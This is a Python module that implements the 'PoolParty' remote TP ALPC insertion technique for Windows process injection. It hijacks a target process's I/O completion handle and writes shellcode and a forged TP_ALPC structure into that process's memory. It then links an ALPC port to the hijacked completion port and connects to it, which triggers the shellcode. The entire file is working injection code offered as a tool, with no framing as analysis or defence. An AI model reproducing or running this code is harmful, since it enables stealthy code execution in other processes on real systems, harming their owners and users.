from pool_party import *
from write_shellcode import *


class RemoteTPAlpcInsertion(PoolParty):
    def __init__(self, process):
        super().__init__(process)
        self.process_handle = HANDLE(0)
        self.handle_io_completion = HANDLE(0)
        self.shellcode_address = 0

    def hijack(self):
        self.handle_io_completion = self.hijack_process_handle(IO_COMPLETION_OBJECT_NAME,
                                                               ULONG(IO_COMPLETION_ALL_ACCESS))
        return True

    def write_shellcode_to_pool(self):
        self.shellcode_address = write_shellcode(self.process_handle)
        return True

    def setup_execute(self):
        temp_alpc_handle = HANDLE(0)
        nt_status = NtAlpcCreatePort(byref(temp_alpc_handle), None, None)
        if nt_status != 0:
            logging.error("[-] NtAlpcCreatePort Failed with NTSTATUS {:x}".format(nt_status))
            return False

        tp_alpc_struct_size = 296
        tp_alpc_ptr = (c_ubyte * tp_alpc_struct_size)()
        ptr = cast(byref(tp_alpc_ptr), LPVOID)
        # This API different with API in C/C++, arg1 with change new memory to store data
        nt_status = TpAllocAlpcCompletion(byref(ptr), temp_alpc_handle, self.shellcode_address, None, None)
        if nt_status != 0:
            logging.error("[-] TpAllocAlpcCompletion Failed with NTSTATUS {:x}".format(nt_status))
            return False

        # So, i need copy new data to old buffer
        memmove(tp_alpc_ptr, ptr, tp_alpc_struct_size)

        alpc_buffer = create_unicode_buffer(POOL_PARTY_ALPC_PORT_NAME)
        alpc_buffer_size = len(alpc_buffer) * sizeof(c_wchar)

        unicode_buffer = UNICODE_STRING()
        unicode_buffer.length = (len(alpc_buffer) - 1) * sizeof(c_wchar)
        unicode_buffer.maximum_length = alpc_buffer_size
        unicode_buffer.buffer = cast(byref(alpc_buffer), POINTER(c_wchar))

        alpc_object_attributes = OBJECT_ATTRIBUTES()
        alpc_object_attributes.length = sizeof(OBJECT_ATTRIBUTES)
        alpc_object_attributes.object_name = POINTER(UNICODE_STRING)(unicode_buffer)

        alpc_port_attributes_size = 72
        alpc_port_attributes = (c_ubyte * alpc_port_attributes_size)()
        flag = convert_buffer_to_struct(alpc_port_attributes, c_uint64, 0)
        flag.value = 0x20000
        max_message_length = convert_buffer_to_struct(alpc_port_attributes, c_uint64, 16)
        max_message_length.value = 328

        alpc_handle = HANDLE(0)
        nt_status = NtAlpcCreatePort(byref(alpc_handle), byref(alpc_object_attributes), byref(alpc_port_attributes))
        if nt_status != 0:
            logging.error("[-] NtAlpcCreatePort Failed with NTSTATUS {:x}".format(nt_status))
            return False

        remote_tp_alpc_ptr = VirtualAllocEx(self.process_handle, None, SIZE_OF_FULL_TP_ALPC_STRUCT, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        if remote_tp_alpc_ptr is None:
            logging.error("[-] VirtualAllocEx for Full TP Alpc Failed with error code %d" % GetLastError())
            return False

        if not WriteProcessMemory(self.process_handle, remote_tp_alpc_ptr, byref(tp_alpc_ptr), SIZE_OF_FULL_TP_ALPC_STRUCT, None):
            logging.error("[-] WriteProcessMemory for Remote TP Alpc Failed with error code %d" % GetLastError())
            return False

        alpc_port_asssociate_completion_port = ALPC_PORT_ASSOCIATE_COMPLETION_PORT()
        alpc_port_asssociate_completion_port.completion_key = remote_tp_alpc_ptr
        alpc_port_asssociate_completion_port.completion_port = self.handle_io_completion

        nt_status = NtAlpcSetInformation(alpc_handle, AlpcAssociateCompletionPortInformation, byref(alpc_port_asssociate_completion_port), sizeof(ALPC_PORT_ASSOCIATE_COMPLETION_PORT))
        if nt_status != 0:
            logging.error("[-] NtAlpcSetInformation Failed with NTSTATUS {:x}".format(nt_status))
            return False

        alpc_client_object_attributes = OBJECT_ATTRIBUTES()
        alpc_client_object_attributes.length = sizeof(OBJECT_ATTRIBUTES)

        buffer = create_string_buffer(POOL_PARTY_POEM_BYTES)

        client_alpc_port_message = (c_ubyte * SIZE_OF_ALPC_MESSAGE_STRUCT)()

        total_length = convert_buffer_to_struct(client_alpc_port_message, c_uint16, 2)
        total_length.value = SIZE_OF_PORT_MESSAGE_STRUCT + len(buffer)

        data_length = convert_buffer_to_struct(client_alpc_port_message, USHORT, 0)
        data_length.value = len(buffer)

        dest_ptr = cast(client_alpc_port_message, c_void_p).value + 0x28
        memmove(dest_ptr, buffer, len(buffer))

        li_timeout = c_size_t(-10000000)
        alpc_handle_1 = HANDLE(0)

        size_of_client_alpc_port_message = SIZE(sizeof(client_alpc_port_message))

        nt_status = NtAlpcConnectPort(byref(alpc_handle_1),
                                      byref(unicode_buffer),
                                      byref(alpc_client_object_attributes), byref(alpc_port_attributes),
                                      0x20000, None, byref(client_alpc_port_message),
                                      byref(size_of_client_alpc_port_message), None, None, byref(li_timeout))
        if nt_status != 0:
            logging.error("[-] NtAlpcConnectPort failed with NTSTATUS 0x{:x}".format(nt_status))
            return False

        logging.info("[+] Executing shellcode....")

